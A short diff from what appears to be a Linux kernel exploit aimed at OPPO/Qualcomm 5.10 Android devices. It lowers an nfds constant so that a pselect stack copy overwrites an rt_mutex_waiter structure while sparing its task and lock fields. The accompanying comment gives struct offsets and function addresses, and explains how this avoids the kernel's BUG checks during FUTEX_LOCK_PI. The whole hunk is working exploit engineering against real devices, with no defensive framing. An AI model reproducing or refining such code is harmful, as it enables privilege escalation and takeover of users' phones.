@@ -74,7 +74,15 @@ extern int g_core_consumer;
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
 #define CONSUMER_MAX_CALLS 1
-#define PSELECT_ROUTE_NFDS 320
+/* 128 -> 2 words per set -> core_sys_select copies only bits[0..5] onto the
+ * waiter (waiter+0x00..+0x28). waiter->task (+0x30) and waiter->lock (+0x38)
+ * fall OUTSIDE the copied window and keep their real kernel-written values.
+ * This is mandatory on OPPO/QC 5.10: task_blocks_on_rt_mutex (0x1eaa28),
+ * remove_waiter (0x1eb540) and mark_wakeup_next_waiter (0x1ea138) all BUG
+ * (brk #0x800) when the tree root's ->lock != lock; with 320 nfds the
+ * FD_ZERO'd copy zeroed waiter->lock and the consumer's first FUTEX_LOCK_PI
+ * panicked on entry. With 128 nfds the checks see the real pi_mutex. */
+#define PSELECT_ROUTE_NFDS 128
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_CONSUMER_SETTLE_USEC 250000
